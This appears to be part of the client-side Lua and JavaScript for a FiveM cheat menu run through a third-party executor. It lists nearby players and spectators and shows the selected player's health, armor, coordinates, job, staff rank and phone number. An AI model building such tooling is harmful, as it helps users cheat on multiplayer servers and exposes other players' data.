            refreshMenu()
        end)
    end
}
menuConfig[#menuConfig + 1] = searchItem

if isAdmin() then
    for i = 1, #menuConfig do
        local item = menuConfig[i]

        if item.label == 'Settings' and item.tabs then
            item.tabs[#item.tabs + 1] = adminTab
            break
        end
    end
end

CreateThread(function()
    while true do
        Wait(1000)

        MachoSendDuiMessage(Dui, json.encode({
            action = 'setDiscord_user',
            discordUser = GetPlayerName(PlayerId()) or discordUser
        }))

        if showSpectatorListState then
            SendSvelte('updateSpectators', { Spectators = getSpectators() })
        end

        if not menuOpen then goto continue end

        local dividerIndex = -1
        for i = 1, #onlineListSubmenu do
            local item = onlineListSubmenu[i]
            if item and item.type == 'divider' and item.label == 'Render Players' then
                dividerIndex = i
                break
            end
        end

        if dividerIndex ~= -1 then
            local coords = GetEntityCoords(PlayerPedId())
            local nearby = getPlayers(coords, 350.0)

            for i = #onlineListSubmenu, dividerIndex + 1, -1 do
                table.remove(onlineListSubmenu, i)
            end

            if #nearby == 0 then
                onlineListSubmenu[#onlineListSubmenu + 1] = {
                    type = 'button',
                    label = '',
                    onConfirm = function() end
                }
            else
                table.sort(nearby, function(a, b)
                    return tonumber(a.serverId) < tonumber(b.serverId)
                end)

                for _, player in ipairs(nearby) do
                    local sid = tonumber(player.serverId)
                    local bag = 'player:' .. tostring(sid)
                    local grp = GetStateBagValue(bag, 'group') or GetStateBagValue(bag, 'permission_group')
                    if type(grp) == 'table' then grp = grp.label or grp.name or grp.group end
                    if type(grp) ~= 'string' or grp == '' or grp == 'user' then grp = nil end
                    onlineListSubmenu[#onlineListSubmenu + 1] = {
                        type = 'checkbox',
                        label = string.format('[%d] %s%s', sid, player.name, grp and ' (' .. grp .. ')' or ''),
                        serverId = sid,
                        checked = setPlayers[sid] or false,
                        onConfirm = function(checked)
                            if checked then
                                for k in pairs(setPlayers) do
                                    setPlayers[k] = false
                                end

                                for _, entry in ipairs(onlineListSubmenu) do
                                    if entry.type == 'checkbox' and entry.serverId then
                                        entry.checked = false
                                    end
                                end
                            end
                            setPlayers[sid] = checked
                        end
                    }
                end
            end

            for k in pairs(setPlayers) do
                local found = false
                for _, player in ipairs(nearby) do
                    if tonumber(player.serverId) == tonumber(k) then
                        found = true
                        break
                    end
                end
                if not found then
                    setPlayers[k] = nil
                end
            end

            if menuConfig == onlineListSubmenu then
                setCurrent()
            end
        end

        ::continue::
    end
end)

CreateThread(function()
    local showing = false
    local phoneCache = {}
    local jobCache = {}
    while true do
        Wait(150)
        if not menuOpen or menuConfig ~= onlineListSubmenu then
            if showing then
                showing = false
                SendSvelte('playerInfo', { visible = false })
            end
            goto skipPI
        end
        local item = menuConfig[activeIndex]
        if not item or not item.serverId then
            if showing then
                showing = false
                SendSvelte('playerInfo', { visible = false })
            end
            goto skipPI
        end
        local sid = item.serverId
        local targetId = GetPlayerFromServerId(sid)
        local targetPed = GetPlayerPed(targetId)
        if not DoesEntityExist(targetPed) then
            if showing then
                showing = false
                SendSvelte('playerInfo', { visible = false })
            end
            goto skipPI
        end
        showing = true
        local pos = GetEntityCoords(targetPed)
        local selfPos = GetEntityCoords(PlayerPedId())
        local bag = 'player:' .. tostring(sid)
        local grp = GetStateBagValue(bag, 'group') or GetStateBagValue(bag, 'permission_group')
        if type(grp) == 'table' then grp = grp.label or grp.name or grp.group end
        if type(grp) ~= 'string' or grp == '' or grp == 'user' then grp = nil end
        SendSvelte('playerInfo', {
            visible  = true,
            name     = GetPlayerName(targetId) or '?',
            sid      = sid,
            dead     = IsEntityDead(targetPed),
            health   = math.max(0, GetEntityHealth(targetPed) - 100),
            armor    = GetPedArmour(targetPed),
            speed    = math.floor(GetEntitySpeed(targetPed) * 3.6),
            dist     = math.floor(#(pos - selfPos)),
            coords   = { x = math.floor(pos.x * 10) / 10, y = math.floor(pos.y * 10) / 10, z = math.floor(pos.z * 10) / 10 },
            phone    = phoneCache[sid] or nil,
            job      = jobCache[sid] and jobCache[sid].name or nil,
            grade    = jobCache[sid] and jobCache[sid].grade or nil,
            admin    = grp or nil,
        })
        if phoneCache[sid] == nil then
            if GetResourceState('lb-phone') == 'started' then
                phoneCache[sid] = GetStateBagValue('player:' .. tostring(sid), 'phoneNumber') or false
            else
                phoneCache[sid] = false
            end
        end
        if jobCache[sid] == nil then
            if GetResourceState('es_extended') == 'started' then
                local bag = 'player:' .. tostring(sid)
                local raw = GetStateBagValue(bag, 'job') or GetStateBagValue(bag, 'job2')
                local label, grade = false, false
                if type(raw) == 'table' then
                    label = raw.label or raw.name or raw.job
                    if label then label = tostring(label) end
                    if type(raw.grade) == 'table' then
                        grade = raw.grade.label or raw.grade.name or false
                    elseif raw.grade ~= nil then
                        grade = tostring(raw.grade)
                    end
                elseif type(raw) == 'string' and raw ~= '' then
                    label = raw
                end
                jobCache[sid] = { name = label or false, grade = grade }
            else
                jobCache[sid] = { name = false, grade = false }
            end
        end
        ::skipPI::
    end
end)

CreateThread(function()
    Wait(1200)
    MachoShowDui(Dui)

    MachoExecuteDuiScript(Dui, [[
        (function() {
            const style = document.createElement('style');
            style.textContent = `
                .crosshair-dot {
                    position: fixed;
                    top: 50%;
                    left: 50%;
                    transform: translate(-50%, -50%);
                    width: 6px;
                    height: 6px;
                    background: #fff;
                    border-radius: 50%;
                    border: 1px solid var(--color-mainSolid, #7c3aed);
                    box-shadow: 0 0 0.7vh var(--color-shadow, rgba(124,58,237,0.35));
                    pointer-events: none;
                    z-index: 99999;
                }

                   from the text shadow, not from a box. */
                .hovering-text-wrap {
                    position: fixed;
                    bottom: 7.5vh;
                    left: 50%;
                    transform: translateX(-50%);
                    display: flex;
                    flex-direction: column;
                    align-items: center;
                    justify-content: center;
                    box-sizing: border-box;
                    outline: none;
                    min-width: 26vh;
                    background: transparent;
                    z-index: 9990;
                    font-family: Geist, ui-sans-serif, system-ui, "Segoe UI", Roboto, sans-serif;
                }

                .hovering-text-list {
                    list-style: none;
                    margin: 0;
                    padding: 0;
                    width: 100%;
                    text-align: center;
                    pointer-events: none;
                    user-select: none;
                    overflow-y: auto;
                    overflow-x: hidden;
                    scrollbar-width: none;
                    -ms-overflow-style: none;
                    display: flex;
                    flex-direction: column;
                    align-items: stretch;
                    gap: 0.15vh;
                    scroll-behavior: smooth;
                }

                .hovering-text-list::-webkit-scrollbar {
                    display: none;
                }

                .hovering-text-item {
                    display: flex;
                    align-items: center;
                    justify-content: center;
                    box-sizing: border-box;
                    height: 2.3vh;
                    padding: 0 0.6vh;
                    font-size: 1.15vh;
                    font-weight: 500;
                    line-height: 1;
                    white-space: nowrap;
                    color: rgba(255, 255, 255, 0.45);
                    text-shadow: 0 0.1vh 0.35vh rgba(0, 0, 0, 0.95);
                    transition: color 0.18s ease;
                }

                .hovering-text-inactive {
                    color: rgba(255, 255, 255, 0.45);
                    transform: none;
                    letter-spacing: 0;
                }

                .hovering-text-selected {
                    transform: none;
                    font-weight: 600;
                    letter-spacing: 0;
                    color: var(--color-glow, #9d5cff);
                    text-shadow: 0 0.1vh 0.4vh rgba(0, 0, 0, 1);
                }

                @keyframes hovering-text-pulse {
                    0% { transform: translateY(-0.185vh) scale(1.03); }
                    30% { transform: translateY(-0.556vh) scale(1.08); }
                    100% { transform: translateY(-0.185vh) scale(1.03); }
                }

                .hovering-text-activated {
                    animation: hovering-text-pulse 0.42s cubic-bezier(.2,.9,.3,1) both;
                }

                .hovering-text-toast {
                    position: absolute;
                    left: 50%;
                    transform: translateX(-50%);
                    bottom: 8vh;
                    background: transparent;
                    padding: 0.556vh 1.111vh;
                    border-radius: 0.741vh;
                    font-weight: 600;
                    opacity: 0;
                    pointer-events: none;
                    transition: opacity 0.26s ease;
                    color: var(--color-glow, #9d5cff);
                }

                .hovering-text-toast.visible {
                    opacity: 1;
                }

                [data-hovering-text-hidden="true"] {
                    display: none !important;
                }
            `;
            document.head.appendChild(style);

            // DOM elements
            const hoveringTextWrap = document.createElement('div');
            hoveringTextWrap.className = 'hovering-text-wrap';
            hoveringTextWrap.tabIndex = 0;
            hoveringTextWrap.setAttribute('role', 'listbox');
            hoveringTextWrap.setAttribute('aria-hidden', 'false');
            hoveringTextWrap.setAttribute('data-hovering-text-hidden', 'true');
            document.body.appendChild(hoveringTextWrap);

            const hoveringTextListEl = document.createElement('ul');
            hoveringTextListEl.className = 'hovering-text-list';
            hoveringTextWrap.appendChild(hoveringTextListEl);

            const hoveringTextToast = document.createElement('div');
            hoveringTextToast.className = 'hovering-text-toast';
            hoveringTextToast.setAttribute('role', 'status');
            hoveringTextToast.setAttribute('aria-live', 'polite');
            document.body.appendChild(hoveringTextToast);

            // State
            let hoveringTextVisible = false;
            let hoveringTextSelectedIndex = 0;
            let hoveringTextOptions = [];
            let hoveringTextItems = [];

            function hoveringTextMainColor() {
                const v = getComputedStyle(document.documentElement).getPropertyValue('--color-glow').trim();
                return v || '#9d5cff';
            }

            function hoveringTextColorizeData(fullData) {
                const accent = hoveringTextMainColor();
                const hasParentheses = fullData.includes('(');

                if (hasParentheses) {
                    return fullData.replace(/\(([^)]+)\)/g, `(<span style="color: ${accent};">$1</span>)`);
                }

                const parts = fullData.split('-');
                if (parts.length > 1) {
                    return parts.map((part, idx) => {
                        if (idx === 0 || idx === parts.length - 1) {
                            return `<span style="color: #fff;">-</span>`;
                        }
                        return `<span style="color: ${accent};">${part}</span>`;
                    }).join('');
                }

                return null;
            }

            function hoveringTextApplySelectedContent(el, fullData) {
                const html = hoveringTextColorizeData(fullData);
                if (html) {
                    el.innerHTML = html;
                    el.style.color = '';
                } else {
                    el.textContent = fullData;
                    el.style.color = '';
                }
            }

            function hoveringTextClamp(value, min, max) {
                return Math.max(min, Math.min(max, value));
            }

            function hoveringTextWrapIndex(index) {
                return hoveringTextItems.length ? ((index % hoveringTextItems.length + hoveringTextItems.length) % hoveringTextItems.length) : 0;
            }

            function hoveringTextFindNearestIndex(prevId) {
                if (!hoveringTextItems.length) return 0;
                const idx = hoveringTextItems.findIndex(it => it.dataset.id === prevId);
                if (idx >= 0) return idx;
                return hoveringTextClamp(hoveringTextSelectedIndex, 0, hoveringTextItems.length - 1);
            }

            function hoveringTextRenderList(preserveSelectedId) {
                const prevSelectedId = preserveSelectedId ?? (hoveringTextItems[hoveringTextSelectedIndex] && hoveringTextItems[hoveringTextSelectedIndex].dataset.id);
                hoveringTextListEl.innerHTML = '';

                hoveringTextOptions.forEach((opt, i) => {
                    const li = document.createElement('li');
                    li.className = 'hovering-text-item hovering-text-inactive';
                    li.dataset.id = String(opt.id);

                    let fullData;
                    if (opt.data && opt.data.trim() !== '') {
                        fullData = `< ${opt.name} ${opt.data} >`;
                    } else {
                        fullData = `< ${opt.name} >`;
                    }

                    li.dataset.data = fullData;
                    li.textContent = String(opt.name);
                    li.id = `hovering-text-opt-${i}`;
                    hoveringTextListEl.appendChild(li);
                });

                hoveringTextItems = Array.from(hoveringTextListEl.querySelectorAll('.hovering-text-item'));
                hoveringTextSelectedIndex = hoveringTextFindNearestIndex(prevSelectedId);
                hoveringTextUpdateSelection();
            }

            function hoveringTextUpdateMask() {
                const scrollTop = hoveringTextListEl.scrollTop;
                const scrollHeight = hoveringTextListEl.scrollHeight;
                const clientHeight = hoveringTextListEl.clientHeight;
                const scrollBottom = scrollHeight - scrollTop - clientHeight;
                const fadeDistance = 50;
                const topFadeAmount = Math.min(scrollTop / fadeDistance, 1);
                const bottomFadeAmount = Math.min(scrollBottom / fadeDistance, 1);
                const topFade = topFadeAmount * 15;
                const bottomFade = 100 - (bottomFadeAmount * 15);
                const safeTopFade = Math.min(topFade, bottomFade - 5);
                const safeBottomFade = Math.max(bottomFade, topFade + 5);
                const gradient = `linear-gradient(to bottom, transparent 0%, black ${safeTopFade}%, black ${safeBottomFade}%, transparent 100%)`;

                hoveringTextListEl.style.maskImage = gradient;
                hoveringTextListEl.style.webkitMaskImage = gradient;
            }

            function hoveringTextScrollToSelected() {
                if (!hoveringTextItems.length || hoveringTextSelectedIndex < 0) return;

                const selectedEl = hoveringTextItems[hoveringTextSelectedIndex];
                if (!selectedEl) return;

                selectedEl.scrollIntoView({
                    behavior: 'smooth',
                    block: 'center'
                });
            }

            function hoveringTextUpdateSelection() {
                if (!hoveringTextItems.length) {
                    hoveringTextSelectedIndex = 0;
                    hoveringTextListEl.innerHTML = '';
                    return;
                }

                hoveringTextItems.forEach((it, i) => {
                    const isSelected = i === hoveringTextSelectedIndex;
                    it.classList.toggle('hovering-text-selected', isSelected);
                    it.classList.toggle('hovering-text-inactive', !isSelected);

                    if (isSelected) {
                        const data = it.dataset.data;
                        hoveringTextApplySelectedContent(it, data);
                        it.setAttribute('aria-current', 'true');
                        hoveringTextWrap.setAttribute('aria-activedescendant', it.id);
                    } else {
                        const opt = hoveringTextOptions.find(o => String(o.id) === it.dataset.id);
                        it.textContent = opt ? opt.name : it.textContent;
                        it.style.color = '';
                        it.removeAttribute('aria-current');
                    }
                });

                hoveringTextScrollToSelected();
                setTimeout(hoveringTextUpdateMask, 50);
            }

            function hoveringTextShowToast(text, ms) {
                ms = ms || 900;
                hoveringTextToast.textContent = text;
                hoveringTextToast.classList.add('visible');
                clearTimeout(hoveringTextShowToast._t);
                hoveringTextShowToast._t = setTimeout(function() {
                    hoveringTextToast.classList.remove('visible');
                }, ms);
            }

            function hoveringTextActivateSelection() {
                const el = hoveringTextItems[hoveringTextSelectedIndex];
                if (!el) return null;

                el.classList.remove('hovering-text-activated');
                void el.offsetWidth;
                el.classList.add('hovering-text-activated');

                const id = el.dataset.id;
                const name = el.textContent.trim();

                hoveringTextShowToast('Selected: ' + name + ' (id: ' + id + ')');

                return { id: id, name: name };
            }

            hoveringTextListEl.addEventListener('scroll', hoveringTextUpdateMask);

            let hoveringTextTransitioning = false;
            let hoveringTextTransitionTimeout = null;

            window.hoveringText = {
                showList: function() {
                    if (hoveringTextTransitioning && hoveringTextVisible) return;

                    if (hoveringTextTransitionTimeout) {
                        clearTimeout(hoveringTextTransitionTimeout);
                        hoveringTextTransitionTimeout = null;
                    }

                    hoveringTextVisible = true;
                    hoveringTextTransitioning = true;

                    hoveringTextWrap.removeAttribute('data-hovering-text-hidden');
                    hoveringTextWrap.setAttribute('aria-hidden', 'false');

                    hoveringTextWrap.style.transition = 'none';
                    hoveringTextWrap.style.opacity = '0';
                    hoveringTextWrap.style.transform = 'translateX(-50%) translateY(1vh)';

                    setTimeout(function() {
                        hoveringTextWrap.style.transition = 'opacity 0.3s cubic-bezier(0.4, 0, 0.2, 1), transform 0.3s cubic-bezier(0.4, 0, 0.2, 1)';
                        hoveringTextWrap.style.opacity = '1';
                        hoveringTextWrap.style.transform = 'translateX(-50%) translateY(0)';

                        hoveringTextTransitionTimeout = setTimeout(function() {
                            hoveringTextTransitioning = false;
                            hoveringTextTransitionTimeout = null;
                        }, 300);
                    }, 10);

                    hoveringTextWrap.focus();
                    hoveringTextRenderList();
                },

                hideList: function() {
                    if (hoveringTextTransitioning && !hoveringTextVisible) return;

                    if (hoveringTextTransitionTimeout) {
                        clearTimeout(hoveringTextTransitionTimeout);
                        hoveringTextTransitionTimeout = null;
                    }

                    hoveringTextVisible = false;
                    hoveringTextTransitioning = true;

                    hoveringTextWrap.style.transition = 'opacity 0.3s cubic-bezier(0.4, 0, 0.6, 1), transform 0.3s cubic-bezier(0.4, 0, 0.6, 1)';
                    hoveringTextWrap.style.opacity = '0';
                    hoveringTextWrap.style.transform = 'translateX(-50%) translateY(1vh)';

                    hoveringTextTransitionTimeout = setTimeout(function() {
                        hoveringTextWrap.setAttribute('data-hovering-text-hidden', 'true');
                        hoveringTextWrap.setAttribute('aria-hidden', 'true');
                        try { hoveringTextWrap.blur(); } catch (e) {}
                        hoveringTextTransitioning = false;
                        hoveringTextTransitionTimeout = null;
                    }, 300);
                },

                toggleVisibility: function() {
                    if (hoveringTextVisible) {
                        this.hideList();
                    } else {
                        this.showList();
                    }
                },

                setOptions: function(newOptions) {
                    newOptions = newOptions || [];
                    hoveringTextOptions = newOptions.map(function(o) {
                        return {
                            id: String(o.id),
                            name: String(o.name),
                            data: String(o.data || '')
                        };
                    });
                    hoveringTextRenderList();
                },

                addOption: function(opt, atIndex) {
                    var prevId = hoveringTextItems[hoveringTextSelectedIndex] && hoveringTextItems[hoveringTextSelectedIndex].dataset.id;
                    var n = {
                        id: String(opt.id),
                        name: String(opt.name),
                        data: String(opt.data || '')
                    };

                    if (atIndex === undefined) {
                        hoveringTextOptions.push(n);
                    } else {
                        hoveringTextOptions.splice(hoveringTextClamp(atIndex, 0, hoveringTextOptions.length), 0, n);
                    }

                    hoveringTextRenderList(prevId);
                },

                removeOptionById: function(id) {
                    var prevId = hoveringTextItems[hoveringTextSelectedIndex] && hoveringTextItems[hoveringTextSelectedIndex].dataset.id;
                    var sid = String(id);
                    var prevLen = hoveringTextOptions.length;

                    hoveringTextOptions = hoveringTextOptions.filter(function(o) {
                        return String(o.id) !== sid;
                    });

                    if (hoveringTextOptions.length === prevLen) return false;

                    hoveringTextRenderList(prevId);
                    return true;
                },

                updateOption: function(id, newData) {
                    var sid = String(id);
                    var optIndex = -1;
                    for (var i = 0; i < hoveringTextOptions.length; i++) {
                        if (String(hoveringTextOptions[i].id) === sid) {
                            optIndex = i;
                            break;
                        }
                    }

                    if (optIndex === -1) return false;

                    var option = hoveringTextOptions[optIndex];
                    var wasSelected = hoveringTextSelectedIndex === optIndex;

                    if (newData.name !== undefined) {
                        option.name = String(newData.name);
                    }

                    if (newData.data !== undefined) {
                        option.data = String(newData.data || '');
                    }

                    if (wasSelected && hoveringTextVisible) {
                        var selectedEl = hoveringTextItems[hoveringTextSelectedIndex];
                        if (selectedEl) {
                            var fullData;
                            if (option.data && option.data.trim() !== '') {
                                fullData = '< ' + option.name + ' ' + option.data + ' >';
                            } else {
                                fullData = '< ' + option.name + ' >';
                            }

                            selectedEl.dataset.data = fullData;
                            hoveringTextApplySelectedContent(selectedEl, fullData);
                        }
                    } else {
                        var el = hoveringTextItems[optIndex];
                        if (el) {
                            var fullData;
                            if (option.data && option.data.trim() !== '') {
                                fullData = '< ' + option.name + ' ' + option.data + ' >';
                            } else {
                                fullData = '< ' + option.name + ' >';
                            }

                            el.dataset.data = fullData;
                            el.textContent = option.name;
                        }
                    }

                    return true;
                },

                getOptions: function() {
                    return hoveringTextOptions.slice();
                },

                getSelected: function() {
                    var el = hoveringTextItems[hoveringTextSelectedIndex];
                    if (!el) return null;
                    return {
                        id: el.dataset.id,
                        name: el.textContent.trim(),
                        index: hoveringTextSelectedIndex
                    };
                },

                selectById: function(id) {
                    var sid = String(id);
                    var idx = -1;
                    for (var i = 0; i < hoveringTextItems.length; i++) {
                        if (hoveringTextItems[i].dataset.id === sid) {
                            idx = i;
                            break;
                        }
                    }
                    if (idx >= 0) {
                        hoveringTextSelectedIndex = idx;
                        hoveringTextUpdateSelection();
                        return true;
                    }
                    return false;
                },

                selectByIndex: function(i) {
                    if (i < 0 || i >= hoveringTextItems.length) return false;
                    hoveringTextSelectedIndex = i;
                    hoveringTextUpdateSelection();
                    return true;
                },

                activate: function() {
                    return hoveringTextActivateSelection();
                },

                moveSelectionDown: function() {
                    if (!hoveringTextVisible) return;
                    hoveringTextSelectedIndex = hoveringTextWrapIndex(hoveringTextSelectedIndex + 1);
                    hoveringTextUpdateSelection();
                },

                moveSelectionUp: function() {
                    if (!hoveringTextVisible) return;
                    hoveringTextSelectedIndex = hoveringTextWrapIndex(hoveringTextSelectedIndex - 1);
                    hoveringTextUpdateSelection();
                },

                moveSelectionHome: function() {
                    if (!hoveringTextVisible) return;
                    hoveringTextSelectedIndex = 0;
                    hoveringTextUpdateSelection();
                },

                moveSelectionEnd: function() {
                    if (!hoveringTextVisible) return;
                    hoveringTextSelectedIndex = Math.max(0, hoveringTextItems.length - 1);
                    hoveringTextUpdateSelection();
                },

                getMainColor: function() {
                    return hoveringTextMainColor();
                },

                refreshColors: function() {
                    hoveringTextUpdateSelection();
                }
            };

            hoveringTextRenderList();
            hoveringTextUpdateMask();

            window.crosshair = {
                element: null,
                show: function() {
                    if (!this.element) {
                        this.element = document.createElement('div');
                        this.element.id = 'screen-crosshair';
                        this.element.className = 'crosshair-dot';
                        document.body.appendChild(this.element);
                    }

                    this.element.style.display = 'block';
                },
                hide: function() {
                    if (this.element) {
                        this.element.style.display = 'none';
                    }
                }
            };
        })();
    ]]);

    setKeybind('Menu Keybind', function()
        defaultBind = MenuKey
        canCancel = false

        onConfirm = function(key)
            MenuKey = key
            toggleMenu(true)
            setCurrent()

            showNotify('Menu keybind set to: ' .. key, 'success')
        end
    end)

    -- while true do
    --     if menuOpen then
    --         setCurrent()
    --         Wait(400)
    --     else
    --         Wait(100)
    --     end
    -- end
end)
